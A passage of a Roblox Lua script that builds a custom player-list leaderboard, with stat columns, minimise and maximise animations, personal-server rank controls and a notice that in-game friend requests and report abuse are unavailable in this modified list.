		BorderColor3 = Color3.new(200/255, 200/255, 200/255),
		Name = "Close",
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
		Font = "SourceSansBold",
		FontSize = "Size12",
		Text = "X",
		TextColor3 = Color3.new(200/255, 200/255, 200/255),
		TextStrokeTransparency = 0,
		Parent = ReportAbuseFrame
	}

	local ReportAbuseHeader = Obj.Create "TextLabel"
	{
		BackgroundTransparency = 1,
		Name = "Sorry",
		Position = UDim2.new(0.5, 0, 0, 20),
		ZIndex = 10,
		Font = "ArialBold",
		FontSize = "Size36",
		Text = "Sorry! :(",
		TextColor3 = Color3.new(200/255, 200/255, 200/255),
		TextStrokeTransparency = 0,
		Parent = ReportAbuseFrame
	}

	local ReportAbuseInfo = Obj.Create "TextLabel"
	{
		BackgroundColor3 = Color3.new(),
		BackgroundTransparency = 0.5,
		BorderColor3 = Color3.new(200/255, 200/255, 200/255),
		Name = "ReportAbuseInfo",
		Position = UDim2.new(0, 0, 0, 50),
		Size = UDim2.new(1, 0, 1, -50),
		Font = "ArialBold",
		FontSize = "Size14",
		Text = "This game is using a specialized player list that uses an API to unlock certain features.  Because this is a modified player list, certain high-level functions are disabled such as in-game Friend Requests and the Report Abuse function.",
		TextColor3 = Color3.new(200/255, 200/255, 200/255),
		TextStrokeTransparency = 0,
		TextYAlignment = "Top",
		ZIndex = 10,
		TextWrapped = true,
		Parent = ReportAbuseFrame,
		Obj.Create"TextLabel"
		{
			BackgroundTransparency = 1,
			Name = "FRs",
			Position = UDim2.new(0, 20, 0, 50),
			Size = UDim2.new(1, -40, 1, -50),
			ZIndex = 10,
			Font = "Arial",
			FontSize = "Size12",
			Text = "To add a friend, you will need to go to the roblox site and find them using the player search page.  Once you've found them, click the \"Add Friend\" button under their character.",
			TextColor3 = Color3.new(200/255, 200/255, 200/255),
			TextStrokeTransparency = 0,
			TextWrapped = true,
			TextYAlignment = "Top"
		},
		Obj.Create"TextLabel"
		{
			BackgroundTransparency = 1,
			Name = "Report",
			Position = UDim2.new(0, 20, 0, 90),
			Size = UDim2.new(1, -40, 1, -50),
			ZIndex = 10,
			Font = "Arial",
			FontSize = "Size12",
			Text = "To report abuse, you need to open your game menu by pressing the 'Esc' button on your keyboard, then click Report Abuse and fill out the necessary information.",
			TextColor3 = Color3.new(200/255, 200/255, 200/255),
			TextStrokeTransparency = 0,
			TextWrapped = true,
			TextYAlignment = "Top"
		}
	}

	local BigButton=Instance.new('ImageButton')
	BigButton.Size=UDim2.new(1,0,1,0)
	BigButton.BackgroundTransparency=1
	BigButton.ZIndex=8
	BigButton.Visible=false
	--BigButton.Active=false
	BigButton.Parent=ScreenGui


	local debugFrame = Obj.Create"Frame"
	{
		Name = 'debugframe',
		Position = UDim2.new(0, 0, 0, 0),
		Size = UDim2.new(0, 150, 0, 800),--0.99000001
		BackgroundTransparency = 1,

	}
	local debugplayers = Obj.Create"TextLabel"
	{
		BackgroundTransparency = .8,
		Position = UDim2.new(0, 0, .01, 0),
		Size = UDim2.new(1,0,.5,0),
		Parent = debugFrame,
		Font = 'ArialBold',
		Text = '--',
		FontSize='Size14',
		TextWrapped=true,
		TextColor3 = Color3.new(1,1,1),
		TextStrokeColor3 = Color3.new(0,0,0),
		TextStrokeTransparency = 0,
		TextXAlignment = 'Right',
		TextYAlignment = 'Center',
	}
	local debugOutput = Obj.Create"TextLabel"
	{
		BackgroundTransparency = .8,
		Position = UDim2.new(0, 0, .5, 0),
		Size = UDim2.new(1,0,.5,0),
		Parent = debugFrame,
		Font = 'ArialBold',
		Text = '--',
		FontSize='Size14',
		TextWrapped=true,
		TextColor3 = Color3.new(1,1,1),
		TextStrokeColor3 = Color3.new(0,0,0),
		TextStrokeTransparency = 0,
		TextXAlignment = 'Right',
		TextYAlignment = 'Center',
	}	


--[[
	simple function to toggle the display of debug output
--]]
	local DebugPrintEnabled=true
	function debugprint(str)
		--print(str)
		if DebugPrintEnabled then
			debugOutput.Text=str
		end
	end


	-------------------------  
	-- Script objects
	------------------------- 
	local RbxGui = RbxGui()

	-- number of entries to show if you click minimize
	local DefaultEntriesOnScreen = 8





	for _,i in pairs(Images) do
		game:GetService("ContentProvider"):Preload("http://www.roblox.com/asset/?id="..i)
	end

	-- ordered array of 'score data', each entry has:
	-- Name(String)
	-- Priority(number)
	-- IsPrimary (bool, should it be shown in upper right)
	-- MaxLength (integer, of the length of the longest element for this column)
	local ScoreNames = {}
	-- prevents flipping in playerlist panels
	local AddId = 0
	-- intermediate table form of all player entries in format of:
	-- Frame
	-- Player
	-- Score
	-- ID
	-- MyTeam (team ENRTY(not actual team) I am currently on)
	local PlayerFrames = {}
	-- intermediate ordered frame array, composed of Entrys of
	-- Frame
	-- MyTeam (my team object)
	-- MyPlayers ( an ordered array of all player frames in team )
	-- AutoHide (bool saying whether it should be hidden)
	-- IsHidden (bool)
	-- ID (int to prevent flipping out of leaderboard, fun times)
	local TeamFrames = {}
	-- one special entry from teamFrames, for unaffiliated players, only shown if players non - empty
	local NeutralTeam = nil

	-- final 'to be displayed' list of frames
	local MiddleFrames = {}
	local MiddleFrameBackgrounds = {}
	local MiddleFrameHeight = .03
	-- time of last click
	local LastClick = 0
	local ButtonCooldown = .25

	local OnIos = false
	pcall(function() OnIos = game:GetService('UserInputService').TouchEnabled end)


	-- you get 200 of x screen space per stat added, start width 16%
	local BaseScreenXSize = 150
	local SpacingPerStat = 10 --spacing between stats


	local MaximizedBounds = UDim2.new(.5,0,1,0)
	local MaximizedPosition = UDim2.new(.25,0,.1,0)
	local NormalBounds = UDim2.new(0,BaseScreenXSize, 0, 800)
	local NormalPosition = UDim2.new(1 , - BaseScreenXSize, 0.005, 0)

	local MinimizedBounds = UDim2.new(0, BaseScreenXSize, 0.99000001, 0)

	--free space to give last stat on the right
	local RightEdgeSpace = -.04

	-- where the scroll par currently is positioned
	local ScrollPosition = 0.75999999
	local IsDragging = false -- am I dragging the player list

	local DefaultBottomClipPos = BottomClipFrame.Position.Y.Scale

	local LastSelectedPlayerEntry = nil
	local SelectedPlayerEntry = nil
	local SelectedPlayer = nil

	-- locks(semaphores) for stopping race conditions
	local AddingFrameLock = false
	local ChangingOrderLock = false
	local AddingStatLock = false
	local BaseUpdateLock = false
	local WaitForClickLock = false
	local InPopupWaitForClick=false
	local PlayerChangedLock = false
	local NeutralTeamLock = false

	local ScrollWheelConnections = {}


	local DefaultListSize = 8
	if not OnIos then DefaultListSize = 12 end
	local DidMinimizeDrag = false

	--local PlaceCreatorId=game.CreatorId

	-- report abuse objects
	local AbuseName
	local Abuses = {
		"Bad Words or Threats",
		"Bad Username",
		"Talking about Dating",
		"Account Trading or Sharing",
		"Asking Personal Questions",
		"Rude or Mean Behavior",
		"False Reporting Me"
	}
	local UpdateAbuseFunction
	local AbuseDropDown, UpdateAbuseSelection

	local PrivilegeLevel = 
		{
			Owner = 255,
			Admin = 240,
			Member = 128,
			Visitor = 10,
			Banned = 0,
		}


	local IsPersonalServer = not not game.Workspace:FindFirstChild("PSVariable")

	game.Workspace.ChildAdded:connect(function(nchild)
		if nchild.Name=='PSVariable' and nchild:IsA('BoolValue') then
			IsPersonalServer=true
		end
	end)
	-------------------------------  
	-- Static Functions
	------------------------------- 
	function GetTotalEntries()
		return math.min(#MiddleFrameBackgrounds,DefaultEntriesOnScreen)
	end

	function GetEntryListLength()
		local numEnts=#PlayerFrames+#TeamFrames
		if NeutralTeam then
			numEnts=numEnts+1
		end
		return numEnts
	end

	function AreAllEntriesOnScreen()
		return #MiddleFrameBackgrounds * MiddleTemplate.Size.Y.Scale <= 1 + DefaultBottomClipPos
	end

	function GetLengthOfVisbleScroll()
		return 1 + DefaultBottomClipPos
	end

	function GetMaxScroll()
		return DefaultBottomClipPos *  - 1
	end
	-- can be optimized by caching when this varible changes
	function GetMinScroll()
		if AreAllEntriesOnScreen() then
			return GetMaxScroll()
		else
			return (GetMaxScroll() - (#MiddleFrameBackgrounds * MiddleTemplate.Size.Y.Scale)) + (1 + DefaultBottomClipPos)
		end
	end

	function AbsoluteToPercent(x,y)
		return Vector2.new(x,y)/ScreenGui.AbsoluteSize
	end
--[[
	tweens property of element from starta to enda over length of time
	Warning: should be put in a Spawn call
	@Args:
	element		textobject to tween transparency on
	propName
	starta		alpha to start tweening
	enda		alpha to end tweening on
	length		how many seconds to spend tweening
--]]
	function TweenProperty(obj, propName, inita, enda, length)
		local startTime = tick()
		while tick()-startTime<length do
			obj[propName] = ((enda-inita)*((tick()-startTime)/length))+inita
			wait(1/30)
		end
		obj[propName] = enda	
	end
--[[
	UGLY UGLY HACK FUNCTION
	replace with some sort of global input catching A.S.A. FREAKING P.
	creates a fullsize gui element to catch next mouse up event(completeing a click)
	@Args:
	frameParent		Object to parent fullscreen gui to
	polledFunction	function to call on mouse moved events in this gui
	exitFunction	function to call when click event is fired
--]]

	function WaitForClick(frameParent,polledFunction,exitFunction)

		if WaitForClickLock then return end
		WaitForClickLock=true
		local upHappened=false
		local connection, connection2
		connection=BigButton.MouseButton1Up:connect(function(nx,ny)
			exitFunction(nx,ny)
			BigButton.Visible=false
			connection:disconnect()
			if connection2 then
				connection2:disconnect()
			end
			--debugprint('mouse up!')
		end)
		connection2=BigButton.MouseMoved:connect( function(nx,ny)
			polledFunction(nx,ny)

		end)

		--debugprint('waiting for click!')
		BigButton.Visible=true
		BigButton.Active=true
		BigButton.Parent=frameParent
		frameParent.AncestryChanged:connect(function(child,nparent) 
			if child == frameParent and nparent ==nil then
				exitFunction(nx,ny)
				BigButton.Visible=false
				connection:disconnect()
				connection2:disconnect()
				debugprint("forced out of wait for click")
			end
		end)
		WaitForClickLock=false
	end



	---------------------------
	--Personal Server Handling
	---------------------------
--[[
	returns privlage level based on integer rank
	Note: these privilege levels seem completely arbitrary, but no documentation exists
	this is all from the old player list, really weird
	@Args:
	rank	Integer rank value for player
	@Return		Normalized integer value for rank?
--]]
	function GetPrivilegeType(rank)
		if rank <= PrivilegeLevel['Banned'] then
			return PrivilegeLevel['Banned']
		elseif rank <= PrivilegeLevel['Visitor'] then
			return PrivilegeLevel['Visitor']
		elseif rank <= PrivilegeLevel['Member'] then
			return PrivilegeLevel['Member']
		elseif rank <= PrivilegeLevel['Admin'] then
			return PrivilegeLevel['Admin']
		else
			return PrivilegeLevel['Owner']
		end
	end

--[[
	gives a player a new privilage rank
	Note: Very odd that I have to use loops with this instead of directly setting the rank
	but no documentation for personal server service exists
	@Args:
	player		player to change rank of
	nrank		new integer rank to give player
--]]
	function SetPrivilegeRank(player,nrank)
		while player.PersonalServerRank<nrank do
			game:GetService("PersonalServerService"):Promote(player)
		end
		while player.PersonalServerRank>nrank do
			game:GetService("PersonalServerService"):Demote(player)
		end
	end
--[[
	called when player selects new privilege level from popup menu
	@Args:
	player		player to set privileges on
	nlevel		new privilege level for this player
--]]
	function OnPrivilegeLevelSelect(player,nlevel,BanPlayerButton,VisitorButton,MemberButton,AdminButton)
		debugprint('setting privilege level')
		SetPrivilegeRank(player,nlevel)
		HighlightMyRank(player,BanPlayerButton,VisitorButton,MemberButton,AdminButton)
	end

--[[
	Highlights current rank of this player in the popup menu
	@Args:
	player		Player to check for rank on
--]]
	function HighlightMyRank(player,BanPlayerButton,VisitorButton,MemberButton,AdminButton)
		BanPlayerButton.Image= 'http://www.roblox.com/asset/?id='..Images['LightPopupMid']
		VisitorButton.Image= 'http://www.roblox.com/asset/?id='..Images['DarkPopupMid']
		MemberButton.Image= 'http://www.roblox.com/asset/?id='..Images['LightPopupMid']
		AdminButton.Image= 'http://www.roblox.com/asset/?id='..Images['DarkPopupBottom']

		local rank=player.PersonalServerRank
		if rank <= PrivilegeLevel['Banned'] then
			BanPlayerButton.Image='http://www.roblox.com/asset/?id='..Images['LightBluePopupMid']
		elseif rank <= PrivilegeLevel['Visitor'] then
			VisitorButton.Image='http://www.roblox.com/asset/?id='..Images['DarkBluePopupMid']
		elseif rank <= PrivilegeLevel['Member'] then
			MemberButton.Image='http://www.roblox.com/asset/?id='..Images['LightBluePopupMid']
		elseif rank <= PrivilegeLevel['Admin'] then
			AdminButton.Image= 'http://www.roblox.com/asset/?id='..Images['DarkBluePopupBottom']
		end
	end

	--------------------------  
	-- Report abuse handling
	-------------------------- 
--[[
	does final reporting of abuse on selected player, calls closeAbuseDialog
--]]
	function OnSubmitAbuse()
	end

--[[
	opens the abuse dialog, initialises text to display selectedplayer
--]]
	function OpenAbuseDialog()
		debugprint('adding report dialog')
		PopUpPanel:TweenPosition(UDim2.new(1,0,0,0), "Out", "Linear", BASE_TWEEN,true)
		ReportAbuseShield.Parent = ScreenGui
		ClosePopUpPanel()
	end
--[[
	resets and closes abuse dialog
--]]
	function CloseAbuseDialog()
		ReportAbuseShield.Parent = nil
	end

	ReportAbuseClose.MouseButton1Click:connect(CloseAbuseDialog)
	ReportAbuseShield.MouseButton1Click:connect(CloseAbuseDialog)

--[[
	creates dropdownbox, registers all listeners for abuse dialog
--]]
	function InitReportAbuse()
	end

	-------------------------------------
	-- Friend/unfriending
	-------------------------------------
--[[
	gets enum val of friend status, uses pcall for some reason?(from old playerlist)
	@Args:
	player	player object to check if friends with
	@Return: enum of friend status
--]]
	local function GetFriendStatus(player)
		if player == game.Players.LocalPlayer then
			return Enum.FriendStatus.NotFriend
		else
			local success, result = pcall(function() return game.Players.LocalPlayer:GetFriendStatus(player) end)
			if success then
				return result
			else
				return Enum.FriendStatus.NotFriend
			end
		end
	end

--[[
	when friend button is clicked, tries to take appropriate action, 
	based on current friend status with SelectedPlayer
--]]
	function OnFriendButtonSelect()
		OpenAbuseDialog()
	end

	function OnFriendRefuseButtonSelect()
	end
	------------------------------------  
	-- Player Entry Handling
	------------------------------------ 
--[[
	used by lua's table.sort to sort player entries
--]]
	function PlayerSortFunction(a,b)
		-- prevents flipping out leaderboard
		if a['Score'] == b['Score'] then
			return GetAliasOf(a['Player'].Name):upper() < GetAliasOf(b['Player'].Name):upper()
		end
		if not a['Score'] then return false end
		if not b['Score'] then return true end
		return a['Score'] < b['Score']
	end

	---------------------------------  
	-- Stat Handling
	---------------------------------  
	-- removes and closes all leaderboard stuffs
	function BlowThisPopsicleStand()
		--ScreenGui:Destroy()
		--script:Destroy()
		--time to make the fanboys rage...
		Tabify()
	end
--[[
	used by lua's table.sort to prioritize score entries
--]]
	function StatSort(a,b)
		-- primary stats should be shown before all others
		if a.IsPrimary ~= b.IsPrimary then
			return a.IsPrimary
		end
		-- if priorities are equal, then return the first added one
		if a.Priority == b.Priority then
			return a.AddId < b.AddId
		end
		return a.Priority < b.Priority
	end
--[[
	doing WAAY too much here, for optimization update only your team
	@Args:
	playerEntry		Entry of player who had a stat change
	property		Name of stat changed
--]]
	function StatChanged(playerEntry,property)

		-- if(playerEntry['MyTeam']) then
		-- UpdateSingleTeam(playerEntry['MyTeam'])
		-- else
		BaseUpdate()
		-- end
	end
--[[
	Called when stat is added
	if playerEntry is localplayer, will add to score names and re-sort the stats, and resize the width of the leaderboard
	for all players, will add a listener for if this stat changes
	if stat is a string value, crashes the leaderboard
	Note:change crash to a 'tabify' leaderboard later
	@Args:
	nchild			new child value to leaderstats
	playerEntry		entry this stat was added to
--]]
	function StatAdded(nchild,playerEntry)
		-- dont re - add a leaderstat I alreday have
		while AddingStatLock do debugprint('in stat added function lock') wait(1/30) end
		AddingStatLock = true
		if not (nchild:IsA('StringValue') or nchild:IsA('IntValue') or nchild:IsA('BoolValue') or nchild:IsA('NumberValue') or nchild:IsA('DoubleConstrainedValue') or nchild:IsA('IntConstrainedValue')) then
			BlowThisPopsicleStand()
		else
			local haveScore = false
			for _,i in pairs(ScoreNames) do
				if i['Name']==nchild.Name then haveScore=true end
			end
			if not haveScore then
				local nstat = {}
				nstat['Name'] = nchild.Name
				nstat['Priority'] = 0
				if(nchild:FindFirstChild('Priority')) then
					nstat['Priority'] = nchild.Priority
				end
				nstat['IsPrimary'] = false
				if(nchild:FindFirstChild('IsPrimary')) then
					nstat['IsPrimary'] = true
				end
				nstat.AddId = AddId
				AddId = AddId + 1
				table.insert(ScoreNames,nstat)
				table.sort(ScoreNames,StatSort)
				if not StatTitles:FindFirstChild(nstat['Name']) then
					CreateStatTitle(nstat['Name'])
				end
				UpdateMaximize()

			end
		end
		AddingStatLock = false
		StatChanged(playerEntry)
		nchild.Changed:connect(function(property) StatChanged(playerEntry,property) end)


	end
	--returns whether any of the existing players has this stat
	function DoesStatExist(statName, exception)
		for _,playerf in pairs(PlayerFrames) do
			if playerf['Player'] ~= exception and playerf['Player']:FindFirstChild('leaderstats') and playerf['Player'].leaderstats:FindFirstChild(statName) then
				--print('player:' .. playerf['Player'].Name ..' has stat')
				return true
			end
		end
		return false
	end



--[[
	Called when stat is removed from player
	for all players, destroys the stat frame associated with this value,
	then calls statchanged(to resize frame)
	if playerEntry==localplayer, will remove from scorenames
	@Args:
	nchild			___value to be removed
	playerEntry		entry of player value is being removed from
--]]
	function StatRemoved(nchild,playerEntry)
		while AddingStatLock do debugprint('In Adding Stat Lock1') wait(1/30) end
		AddingStatLock = true
		if playerEntry['Frame']:FindFirstChild(nchild.Name) then
			debugprint('Destroyed frame!')
			playerEntry['Frame'][nchild.Name].Parent = nil
		end
		if not DoesStatExist(nchild.Name, playerEntry['Player']) then
			for i,val in ipairs(ScoreNames) do
				if val['Name'] == nchild.Name then
					table.remove(ScoreNames,i)
					if StatTitles:FindFirstChild(nchild.Name) then
						StatTitles[nchild.Name]:Destroy()
					end
					for _,teamf in pairs(TeamFrames) do
						if teamf['Frame']:FindFirstChild(nchild.Name) then
							teamf['Frame'][nchild.Name]:Destroy()
						end
					end
				end
			end
		end
		AddingStatLock = false
		StatChanged(playerEntry)
	end
--[[
	clears all stats from a given playerEntry
	used when leaderstats are removed, or when new leaderstats are added(for weird edge case)+
--]]
	function RemoveAllStats(playerEntry)
		for i,val in ipairs(ScoreNames) do
			StatRemoved(val,playerEntry)
		end

	end


	function GetScoreValue(score)
		if score:IsA('DoubleConstrainedValue') or score:IsA('IntConstrainedValue') then 
			return score.ConstrainedValue
		elseif score:IsA('BoolValue') then
			if score.Value then return 1 else return 0 end
		else
			return score.Value
		end
	end
--[[
	
--]]
	function MakeScoreEntry(entry,scoreval,panel)
		if not panel:FindFirstChild('PlayerScore') then return end
		local nscoretxt = panel:FindFirstChild('PlayerScore'):Clone()
		local thisScore = nil
		--here lies the resting place of a once great and terrible bug
		--may its treachery never be forgoten, lest its survivors fall for it again
		--RIP the leaderstat bug, oct 2012-nov 2012
		wait()
		if entry['Player']:FindFirstChild('leaderstats') and entry['Player'].leaderstats:FindFirstChild(scoreval['Name']) then
			thisScore = entry['Player']:FindFirstChild('leaderstats'):FindFirstChild(scoreval['Name'])
		else
			return
		end

		if not entry['Player'].Parent then return end

		nscoretxt.Name = scoreval['Name']
		nscoretxt.Text = tostring(GetScoreValue(thisScore))
		if scoreval['Name'] == ScoreNames[1]['Name'] then
			debugprint('changing score')
			entry['Score'] = GetScoreValue(thisScore)
			if entry['Player'] == LocalPlayer then HeaderScore.Text = tostring(GetScoreValue(thisScore)) end
		end

		thisScore.Changed:connect(function()
			if not thisScore.Parent then return end
			if scoreval['Name'] == ScoreNames[1]['Name'] then

				entry['Score'] = GetScoreValue(thisScore)
				if entry['Player'] == LocalPlayer then HeaderScore.Text = tostring(GetScoreValue(thisScore)) end
			end
			nscoretxt.Text = tostring(GetScoreValue(thisScore))
			BaseUpdate()
		end)
		return nscoretxt

	end

	function CreateStatTitle(statName)

		local ntitle = MiddleTemplate:FindFirstChild('PlayerScore'):Clone()
		ntitle.Name = statName
		ntitle.Text = statName
		-- ntitle
		if IsMaximized.Value then
			ntitle.TextTransparency = 0
		else
			ntitle.TextTransparency = 1
		end
		ntitle.Parent = StatTitles
	end

	function RecreateScoreColumns(ptable)
		while AddingStatLock do debugprint ('In Adding Stat Lock2') wait(1/30) end
		AddingStatLock = true
		local Xoffset=5--15 --current offset from Right
		local maxXOffset=Xoffset
		local MaxSizeColumn=0 --max size for this column

		-- foreach known leaderstat
		for j = #ScoreNames, 1,-1 do
			local scoreval = ScoreNames[j]

			MaxSizeColumn=0
			-- for each entry in this player table
			for i,entry in ipairs(ptable) do
				local panel = entry['Frame']
				local tplayer = entry['Player']
				-- if this panel does not have an element named after this stat
				if not panel:FindFirstChild(scoreval['Name']) then
					-- make an entry for this object
					local nentry = MakeScoreEntry(entry,scoreval,panel)
					if nentry then
						debugprint('adding '..nentry.Name..' to '..entry['Player'].Name )
						nentry.Parent = panel
						-- add score to team
						if entry['MyTeam'] and entry['MyTeam'] ~= NeutralTeam and not entry['MyTeam']['Frame']:FindFirstChild(scoreval['Name']) then
							local ntitle = nentry:Clone()
							--ntitle.TextXAlignment  = 'Right'
							ntitle.Parent = entry['MyTeam']['Frame']
						end

					end
				end
				scoreval['XOffset']=Xoffset

				if panel:FindFirstChild(scoreval['Name']) then
					MaxSizeColumn=math.max(MaxSizeColumn,panel[scoreval['Name']].TextBounds.X)
				end
			end

			if AreNamesExpanded.Value then
				MaxSizeColumn=math.max(MaxSizeColumn,StatTitles[scoreval['Name'] ].TextBounds.X)
				StatTitles[scoreval['Name'] ]:TweenPosition(UDim2.new(RightEdgeSpace,-Xoffset,0,0),'Out','Linear',BASE_TWEEN,true)
			else
				StatTitles[scoreval['Name'] ]:TweenPosition(UDim2.new((.4+((.6/#ScoreNames)*(j-1)))-1,0,0,0),'Out','Linear',BASE_TWEEN,true)
			end
			scoreval['ColumnSize']=MaxSizeColumn
			Xoffset= Xoffset+SpacingPerStat+MaxSizeColumn
			maxXOffset=math.max(Xoffset,maxXOffset)
		end
		NormalBounds = UDim2.new(0, BaseScreenXSize+maxXOffset-SpacingPerStat,0,800)
		NormalPosition = UDim2.new(1 , -NormalBounds.X.Offset, NormalPosition.Y.Scale, 0)
		UpdateHeaderNameSize()
		UpdateMaximize()

		AddingStatLock = false
	end
	---------------------------  
	-- Minimizing and maximizing
	--------------------------- 

	function ToggleMinimize()
		IsMinimized.Value = not IsMinimized.Value
		UpdateStatNames()
	end

	function ToggleMaximize()
		IsMaximized.Value = not IsMaximized.Value
		RecreateScoreColumns(PlayerFrames) --done to re-position stat names NOTE: optimize-able
	end

	function Tabify()
		IsTabified.Value= true
		IsMaximized.Value=false
		IsMinimized.Value=true
		UpdateMinimize()
		IsTabified.Value= true
		ScreenGui:TweenPosition(UDim2.new(NormalBounds.X.Scale, NormalBounds.X.Offset-10, 0,0),'Out','Linear',BASE_TWEEN*1.2,true)
	end

	function UnTabify()
		if IsTabified.Value then
			IsTabified.Value= false
			ScreenGui:TweenPosition(UDim2.new(0, 0, 0,0),'Out','Linear',BASE_TWEEN*1.2,true)
		end
	end

--[[
	Does more than it looks like
	monitors positions of the clipping frames and bottom frames
	called from EVERYWHERE, too much probably
--]]
	function UpdateMinimize()

		if IsMinimized.Value then
			if IsMaximized.Value then
				ToggleMaximize()
			end
			if not IsTabified.Value then
				MainFrame:TweenSizeAndPosition(UDim2.new(0.010, HeaderName.TextBounds.X, NormalBounds.Y.Scale,NormalBounds.Y.Offset),
					UDim2.new(.990, -HeaderName.TextBounds.X, NormalPosition.Y.Scale,0),'Out','Linear',BASE_TWEEN*1.2,true)
			else 
				MainFrame:TweenSizeAndPosition(NormalBounds,NormalPosition,'Out','Linear',BASE_TWEEN*1.2,true)
			end
			--(#MiddleFrameBackgrounds*MiddleBGTemplate.Size.Y.Scale)
			BottomClipFrame:TweenPosition(UDim2.new(0,0,-1,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			BottomFrame:TweenPosition(UDim2.new(0,0,0,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			FocusFrame.Size=UDim2.new(1,0,HeaderFrameHeight,0)
			ExtendTab.Image = 'http://www.roblox.com/asset/?id=94692731'
		else
			if not IsMaximized.Value then
				MainFrame:TweenSizeAndPosition(NormalBounds,NormalPosition,'Out','Linear',BASE_TWEEN*1.2,true)
			end
			--do limiting
			DefaultBottomClipPos = math.min(math.max(DefaultBottomClipPos,-1),-1+(#MiddleFrameBackgrounds*MiddleBGTemplate.Size.Y.Scale))
			UpdateScrollPosition()

			BottomClipFrame.Position=UDim2.new(0,0,DefaultBottomClipPos,0)
			local bottomPositon = (DefaultBottomClipPos+BottomClipFrame.Size.Y.Scale)
			BottomFrame.Position=UDim2.new(0,0,bottomPositon,0)
			FocusFrame.Size=UDim2.new(1,0,bottomPositon + HeaderFrameHeight,0)
			ExtendTab.Image = 'http://www.roblox.com/asset/?id=94825585' 
		end
	end

--[[
	Manages the position/size of the mainFrame, swaps out different resolution images for the frame
	fades in and out the stat names, moves position of headername and header score
--]]
	function UpdateMaximize()
		if IsMaximized.Value then
			for j = 1, #ScoreNames,1 do
				local scoreval = ScoreNames[j]
				StatTitles[scoreval['Name'] ]:TweenPosition(UDim2.new(.4+((.6/#ScoreNames)*(j-1))-1,0,0,0),'Out','Linear',BASE_TWEEN,true)
			end

			if IsMinimized.Value then
				ToggleMinimize()
			else
				UpdateMinimize()
			end


			MainFrame:TweenSizeAndPosition(MaximizedBounds,MaximizedPosition,'Out','Linear',BASE_TWEEN*1.2,true)
			HeaderScore:TweenPosition(UDim2.new(0,0,HeaderName.Position.Y.Scale,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			HeaderName:TweenPosition(UDim2.new( - .1, - HeaderScore.TextBounds.x,HeaderName.Position.Y.Scale,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			HeaderFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeHeader']
			BottomFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeBottom']
			for index, i in ipairs(MiddleFrameBackgrounds) do
				if (index%2) ~= 1 then
					i.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeDark']
				else
					i.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeLight']
				end
			end
			for index, i in ipairs(MiddleFrames) do
				if i:FindFirstChild('ClickListener') then
					i.ClickListener.Size = UDim2.new(.974,0,i.ClickListener.Size.Y.Scale,0)
				end
				for j=1, #ScoreNames,1 do
					local scoreval = ScoreNames[j]
					if i:FindFirstChild(scoreval['Name']) then
						i[scoreval['Name']]:TweenPosition(UDim2.new(.4+((.6/#ScoreNames)*(j-1))-1,0,0,0), "Out", "Linear", BASE_TWEEN,true)
					end
				end
			end
			for i,entry in ipairs(PlayerFrames) do
				WaitForChild(entry['Frame'],'TitleFrame').Size=UDim2.new(.38,0,entry['Frame'].TitleFrame.Size.Y.Scale,0)
			end

			for i,entry in ipairs(TeamFrames) do
				WaitForChild(entry['Frame'],'TitleFrame').Size=UDim2.new(.38,0,entry['Frame'].TitleFrame.Size.Y.Scale,0)
			end

		else
			if not IsMinimized.Value then
				MainFrame:TweenSizeAndPosition(NormalBounds,NormalPosition,'Out','Linear',BASE_TWEEN*1.2,true)
			end
			HeaderScore:TweenPosition(UDim2.new(0,0,.4,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			HeaderName:TweenPosition(UDim2.new(0,0,HeaderName.Position.Y.Scale,0), "Out", "Linear", BASE_TWEEN*1.2,true)
			HeaderFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['NormalHeader']
			BottomFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['NormalBottom']
			for index, i in ipairs(MiddleFrameBackgrounds) do
				if index%2 ~= 1 then
					i.Background.Image = 'http://www.roblox.com/asset/?id='..Images['midDark']
				else
					i.Background.Image = 'http://www.roblox.com/asset/?id='..Images['midLight']
				end
			end
			for index, i in ipairs(MiddleFrames) do
				if i:FindFirstChild('ClickListener') then
					i.ClickListener.Size = UDim2.new(.96,0,i.ClickListener.Size.Y.Scale,0)
					for j=1, #ScoreNames,1 do
						local scoreval = ScoreNames[j]
						if i:FindFirstChild(scoreval['Name']) and scoreval['XOffset'] then
							--print('updateing stat position: ' .. scoreval['Name'])
							i[scoreval['Name']]:TweenPosition(UDim2.new(RightEdgeSpace,-scoreval['XOffset'],0,0), "Out", "Linear", BASE_TWEEN,true)
						end
					end
				end
			end

			for i,entry in ipairs(TeamFrames) do
				WaitForChild(entry['Frame'],'TitleFrame').Size=UDim2.new(0,BaseScreenXSize*.9,entry['Frame'].TitleFrame.Size.Y.Scale,0)

			end
			for i,entry in ipairs(PlayerFrames) do
				WaitForChild(entry['Frame'],'TitleFrame').Size=UDim2.new(0,BaseScreenXSize*.9,entry['Frame'].TitleFrame.Size.Y.Scale,0)
			end
		end
	end

	function UpdateStatNames()
		if not AreNamesExpanded.Value or IsMinimized.Value then
			CloseNames()
		else
			ExpandNames()
		end
	end

	function ExpandNames()
		if #ScoreNames ~= 0 then
			for _,i in pairs(StatTitles:GetChildren()) do
				Spawn(function()TweenProperty(i,'TextTransparency',i.TextTransparency,0,BASE_TWEEN) end)
			end
			HeaderFrameHeight=.09
			--as of writing, this and 'CloseNames' are the only places headerframe is resized
			HeaderFrame:TweenSizeAndPosition(UDim2.new(HeaderFrame.Size.X.Scale, HeaderFrame.Size.X.Offset, HeaderFrameHeight,0),
				HeaderFrame.Position,'Out','Linear',BASE_TWEEN*1.2,true)
			TopClipFrame:TweenPosition(UDim2.new(TopClipFrame.Position.X.Scale,0,HeaderFrameHeight,0),'Out','Linear',BASE_TWEEN*1.2,true)
			BottomShiftFrame:TweenPosition(UDim2.new(0,0,HeaderFrameHeight,0), "Out", 'Linear', BASE_TWEEN*1.2,true)

		end

	end

	function CloseNames()
		if #ScoreNames ~= 0 then
			HeaderFrameHeight=.07
			if not (IsMaximized.Value) then
				for _,i in pairs(StatTitles:GetChildren()) do
					Spawn(function()TweenProperty(i,'TextTransparency',i.TextTransparency,1,BASE_TWEEN) end)
				end
